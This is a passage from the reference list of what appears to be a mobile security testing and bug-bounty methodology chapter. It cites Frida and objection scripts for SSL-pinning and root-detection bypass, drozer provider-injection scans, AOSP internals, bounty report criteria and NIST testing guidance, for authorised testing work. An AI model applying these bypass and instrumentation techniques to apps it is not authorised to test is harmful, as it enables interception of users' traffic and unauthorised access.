  zero-match behaviour; `objection/console/commands.py` for the full command tree and the agent sources
  `agent/src/android/{pinning,root,keystore,hooking,heap,clipboard,userinterface,proxy,general}.ts`;
  thalysonz/frida-checklist-guide and frida/frida issue 611 for the `Java.available` vs `Java.perform`
  distinction; Frida CodeShare via the JSON API (`@pcipolloni/universal-android-ssl-pinning-bypass-with-frida`,
  `@dzonerzy/fridantiroot`, `@akabe1/frida-multiple-unpinning`, `@leolashkevych/android-deep-link-observer`,
  `@fadeevab/intercept-android-apk-crypto-operations`, `@owen800q/okhttp3-interceptor`, `@dzonerzy/aesinfo`,
  `@sowdust/universal-android-ssl-pinning-bypass-2`, `@fdciabdul/frida-multiple-bypass`,
  `@lichao890427/find-android-hook`, `@Gand3lf/xamarin-antiroot`); the Chromium WebView glue confirming
  `ContentSettingsAdapter extends WebSettings`.
- **AOSP and platform:** Zygote fork and per-app mount-namespace semantics ("at Zygote fork time, we
  create a mount namespace for each running app"); APEX file format (apexd loop + dm-verity mount,
  versioned path plus bind mount); Conscrypt `SystemCertificateSource` and the `system.certs.enabled`
  conditional; the Application Sandbox (adb shell is uid 2000 in its own SELinux domain); SELinux context
  format and AVC record shape; Verified Boot device state; AIDL transaction model, `FLAG_ONEWAY`,
  `getCallingUid()`; AIDL fuzzing (`fuzzService`, `libbinder_ndk_driver.h`, `binder_random_parcel_rs`,
  `service_fuzzer_bindings.go`); `Permissions.md` and `AppOps.md` for `pm grant/revoke`, `adb install -g`,
  `appops set/get/reset` and the `dumpsys` output shapes; Android 12/14/15/16 behaviour-change pages for
  `detectUnsafeIntentLaunch()`, `detectBlockedBackgroundActivityLaunch()`, the trampoline and untrusted-touch
  log strings, `INSTALL_FAILED_DEPRECATED_SDK_VERSION` / `--bypass-low-target-sdk-block`, and the Android
  12 `adb backup` exclusion; `developer.android.com/guide/topics/data/testingbackup` for the `bmgr` and
  D2D transport commands; Play Integrity verdict behaviour on rooted and emulated devices.
- **MITRE ATT&CK Mobile:** T1617 Hooking, T1623.001 Unix Shell (the `su`-spawned frida-server is exactly
  ATT&CK's documented observable), T1632 Subvert Trust Controls, T1638 Adversary-in-the-Middle,
  T1521.003 SSL Pinning, T1633.001 System Checks, T1406 / T1406.002 Obfuscated Files or Information /
  Software Packing, T1474.001 Compromise Software Dependencies and Development Tools.
- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`): `lack_of_binary_hardening.*`
  (all P5, including `runtime_instrumentation_based`), the whole `mobile_security_misconfiguration` and
  `insecure_data_storage` branches, and the P1/P2 categories a mobile finding must reach —
  `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`,
  `broken_access_control.idor.*`, `broken_authentication_and_session_management.authentication_bypass`,
  `server_side_injection.sql_injection`, `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints`.
- **Programme economics and report quality:** Google Mobile VRP "Good Quality" criteria (the 0.5x / 1x /
  1.5x multiplier; *"a short proof-of-concept is more valuable than a video explaining the consequences of
  a specific bug"*; a functional PoC as a machine-readable attachment; device and build reported as text,
  not screenshots; the warning about emulators and rooted devices); Samsung's *"Reports based only on
  static code review, without a working PoC, will be determined as Not Eligible"* and the Good Report
  Bonus; Bugcrowd's submission guidance (PoC video or screenshots at minimum; 25,000-character
  description; up to 20 attachments under 400 MB each); Intigriti triage standards making the PoC the
  scoring input; AOSP severity modifiers capping unlocked-bootloader and Developer-Mode findings at "no
  higher than Low".
- **Disclosed reports:** H1 #291764 (Nextcloud, drozer `scanner.provider.injection`, Low 0.9, $150),
  #289000 (Bitwarden, drozer sweep, Low), #242727 (Nextcloud, `adb shell content query` **plus** an
  off-the-shelf Play Store provider client, $75), #518669, #534541, #205000 and #202425 (emulator +
  Charles, with both the 400 and the 204 pasted verbatim), #168538 (Burp transparent mode with a rogue
  AP), #2289836 (MercadoLibre, High 8.6, team summary crediting "clear reproduction steps with a
  proof-of-concept code"), #855618 (Shopify), #288955 (IRCCloud, High), #1115864 (Mattermost, High 7.8).
- **Community and vendor tooling research:** HackTricks (`install-burp-certificate.md`,
  `avd-android-virtual-device.md`, `frida-tutorial/README.md` and `objection-tutorial.md`,
  `drozer-tutorial/README.md` and `exploiting-content-providers.md`, `adb-commands.md`,
  `apk-decompilers.md`, `android-anti-instrumentation-and-ssl-pinning-bypass.md`) for the Android 14 APEX
  `nsenter` procedure, the `--rbind` caveat, Magisk/MagiskTrustUserCerts/AlwaysTrustUserCerts, the
  `cmd content` agent-free provider client, the `FLAG_SECURE` strip, Genymotion/Nox limitations (Nox
  supports neither Frida nor drozer) and the objection `sqlite sync` caveat; Hrishikesh's tooling notes;
  YesWeHack's Android recon and lab guides (MobSF limitations, MARA, snapshots, scrcpy); Cobalt's Android
  getting-started guide (frida-server naming convention); Mobile Hacking Lab (r2frida workflow, rabin2
  flag table and r2pipe/zignatures, the fuzzer-selection rule of thumb, AFL++ QEMU persistent mode with an
  in-memory input hook, LibAFL QEMU/Frida modes, the Android ASan runtime requirement
  `libclang_rt.asan-aarch64-android.so`, the NDK cross-compile recipe, and the statically-linked-system-binary
  ASan limitation); mobsfscan and mindedsecurity `semgrep-rules-android-security` (with their
  `impact`/`confidence`/`verification-level` metadata); APKiD/LibScout/LibRadar on obfuscation-resilient
  fingerprinting; apkleaks and apkurlgrep; blutter, reFlutter, hermes-dec, frida-il2cpp-bridge and the
  Pilfer React Native `CatalystInstanceImpl` / `XMLHttpRequest._interceptor` work; Capacitor's
  `CapacitorHttpAndroidInterface`; the practice-app index (ovaa, InsecureShop, InjuredAndroid,
  Damn-Vulnerable-Bank, Vuldroid, Android-InsecureBankv2, diva-android, WheresMyBrowser.Android, VyAPI,
  DVHMA, WaTF Bank, GoatDroid) with the explicit warning that Sieve/FourGoats/GoatDroid defaults are
  Android 4.3-era and must never be generalised.
- **Bug-hunting corpus (the false-positive discipline this chapter enforces):** Marker Discipline (8+
  character random markers, and searching the **baseline** for the marker first); the Body-Diff Rule (a
  byte-identical 200 is not a bypass; status-code-only claims are the most common rejected-as-N/A
  category); the Statistical-Sample Rule (n >= 10 interleaved trials, >= 2 sigma, 100+ samples before
  claiming a rate limit is absent, and the RFC 6238 uniformity trap); Server-Policy-vs-State; the
  Shell-Loop Ban (shell array loops fail silently — always count your results); the Multi-Tool
  Reproduction Bar for Critical/High; the Shadow API mobile-to-backend bridge (diff behaviourally, not by
  response shape — a version difference alone is Informational, the weakened control is the finding); the
  pre-severity gate run against the **Critical claim** rather than the bug; retraction-appendix discipline
  and its inversion for client-patched findings; chain-filing order (primitives first so their ids exist,
  then the consumer, then backfill the links).
- **NIST SP 800-115:** Appendix B §1.3 (Assumptions and Limitations), §2.1 (named personnel), §2.4 (test
  equipment and differentiating the organisation's systems from the testers'), §5.2 (files created to
  facilitate testing and the required actions afterwards), §5.3 (Data Handling), §8.3 (a retest must be a
  mirror copy of the original test).
- **Local senior-researcher corpus:** the rootable-emulator triple constraint (`google_apis` vs
  `google_apis_playstore`, `ps16k` on Apple Silicon, per-API-level image availability with API 35 observed
  working); the zygote-bind symptom; the abstract-framework-class false negative and the `Java.choose`
  preference; the six Frida technique corrections; the macOS/Apple Silicon host traps (`timeout`, the
  readonly `UID`, the half-installed system image, buffered stdout, LibreSSL `openssl zlib`); the
  two-device lab; the validity-tagged decision table and the DEAD-techniques table; the evidence workspace
  layout; and the standing rule that parallel agents and scanners are a hypothesis engine, never an
  oracle.
